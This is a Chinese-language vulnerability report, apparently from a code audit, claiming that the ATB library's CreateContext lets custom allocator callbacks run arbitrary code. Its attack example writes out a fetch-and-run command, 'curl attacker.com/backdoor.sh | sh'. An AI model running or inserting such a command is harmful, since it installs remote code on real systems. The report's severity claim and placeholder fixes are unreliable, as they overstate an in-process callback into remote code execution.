# SEC-001：自定义分配器任意代码执行漏洞

## 漏洞概述

| 属性 | 值 |
|-----------|-------|
| **漏洞编号** | SEC-001 |
| **CWE** | CWE-94 (代码生成控制不当 - 代码注入) |
| **严重级别** | 严重 (Critical) |
| **置信度** | 85/100 |
| **类型** | 任意代码执行 |
| **位置** | `src/atb/context/context.cpp:41-64` |
| **函数** | `CreateContext` |
| **受影响模块** | 上下文管理 |

### 摘要
`CreateContext` API 接受自定义分配器/释放器回调函数，这些函数被直接存储和调用而未进行任何验证。恶意用户可以通过这些回调函数注入任意代码执行，可能实现完全的系统入侵、权限提升或对NPU设备的持久访问。

## 技术细节

### 代码路径分析

**入口点：**
```cpp
// src/atb/context/context.cpp:41-64
Status CreateContext(Context **context, 
                     const std::function<void*(size_t)>& alloc, 
                     const std::function<void(void*)>& dealloc)
{
    // 无 alloc/dealloc 回调验证
    Status st = contextBase->Init(alloc, dealloc);  // 第54行
    // ...
}
```

**传播路径：**
1. **CreateContext** (context.cpp:41) → 接受用户提供的 `std::function` 回调
2. **ContextBase::Init** (context_base.cpp:51-74) → 将回调存储在成员变量中：
   ```cpp
   allocateFunc_ = alloc;      // 第67行
   deallocateFunc_ = dealloc;  // 第68行
   ```
3. **DeviceTilingBufferPool 构造函数** (context_base.cpp:75-76) → 将回调传递给缓冲池
4. **DeviceTilingBufferPool::MallocTotalBuffer** (device_tiling_buffer_pool.cpp:21-32) → 执行回调：
   ```cpp
   return static_cast<uint8_t *>(allocateFunc_(static_cast<size_t>(bufferSize)));  // 第31行
   ```

### 触发条件

漏洞在以下情况下触发：
1. 用户使用自定义分配器函数调用 `CreateContext`
2. 执行任何需要设备分块缓冲区分配的操作
3. 通过 `MallocTotalBuffer` 调用 `allocateFunc_` 回调

**显示直接执行的代码片段：**
```cpp
// device_tiling_buffer_pool.cpp:21-32
uint8_t *DeviceTilingBufferPool::MallocTotalBuffer(uint64_t bufferSize)
{
    if (!allocateFunc_) {
        // 使用 aclrtMalloc 的默认分配
    }
    // 用户回调无验证执行
    return static_cast<uint8_t *>(allocateFunc_(static_cast<size_t>(bufferSize)));
}
```

### 缺失验证

以下安全检查均不存在：
- 无回调函数地址验证
- 无回调函数完整性检查
- 无沙箱或执行上下文限制
- 无回调函数签名验证
- 无回调执行的权限级别检查

## 攻击场景与利用步骤

### 场景1：代码注入攻击

**攻击向量：** 使用ATB库的Python应用程序

**利用步骤：**
1. 在Python/C++中创建恶意分配器函数：
   ```cpp
   void* malicious_alloc(size_t size) {
       // 执行任意shell命令
       system("curl attacker.com/backdoor.sh | sh");
       // 返回有效指针避免立即崩溃
       return malloc(size);
   }
   ```
2. 将恶意分配器传递给 `CreateContext`：
   ```cpp
   atb::Context* ctx;
   atb::CreateContext(&ctx, malicious_alloc, malicious_free);
   ```
3. 通过执行任何ATB操作触发缓冲区分配
4. 恶意代码以库权限执行

### 场景2：权限提升

**攻击向量：** 容器或多用户环境

**利用步骤：**
1. 构造利用NPU驱动漏洞的分配器
2. 使用 `aclrtMalloc` 包装器实现内核级访问
3. 修改设备内存以提升权限
4. 获得对NPU资源的持久访问

### 场景3：数据窃取

**攻击向量：** 共享推理服务

**利用步骤：**
1. 创建复制敏感tensor数据的分配器
2. 窃取模型权重、用户输入或推理结果
3. 将数据发送到攻击者控制的端点
4. 通过重复分配保持持久性

## 影响评估

### 直接影响
- **完全系统入侵：** 以库权限执行任意代码
- **数据泄露：** 访问通过ATB操作的所有tensor数据
- **权限提升：** 通过NPU驱动可能的内核级访问
- **拒绝服务：** 内存损坏导致系统不稳定

### 间接影响
- **模型盗窃：** 窃取专有AI模型权重
- **用户数据暴露：** 访问敏感推理输入/输出
- **供应链攻击：** 库污染影响下游用户
- **基础设施入侵：** 攻击传播到连接的系统

### 受影响用户
- 所有使用ATB库进行基于NPU推理/训练的用户
- 容器化部署环境
- 多租户推理服务
- 共享GPU/NPU集群环境

## 修复建议

### 主要修复

1. **移除自定义分配器API（推荐）**
   ```cpp
   // 完全移除漏洞API
   // 仅暴露 CreateContext(Context **context)
   ```

2. **添加回调验证**
   ```cpp
   Status CreateContext(Context **context, 
                        const std::function<void*(size_t)>& alloc, 
                        const std::function<void(void*)>& dealloc)
   {
       // 验证回调地址
       if (alloc && !IsValidAllocator(alloc)) {
           return ERROR_INVALID_PARAM;
       }
       
       // 限制为预定义分配器类型
       if (!IsApprovedAllocator(alloc)) {
           return ERROR_INVALID_PARAM;
       }
       
       // 沙箱回调执行
       return contextBase->Init(SandboxAllocator(alloc), SandboxDeallocator(dealloc));
   }
   ```

3. **使用白名单分配器注册表**
   ```cpp
   class AllocatorRegistry {
       static std::set<AllocatorType> approvedAllocators_;
       
       static bool IsApproved(const std::function<void*(size_t)>& alloc) {
           // 对照白名单检查
       }
   };
   ```

### 次要缓解措施

1. **添加安全文档**
   - 警告用户自定义分配器风险
   - 提供安全使用指南

2. **添加运行时监控**
   - 监控分配器回调行为
   - 检测异常执行模式

3. **添加访问控制**
   - 将自定义分配器API限制为特权用户
   - 添加基于能力的权限检查
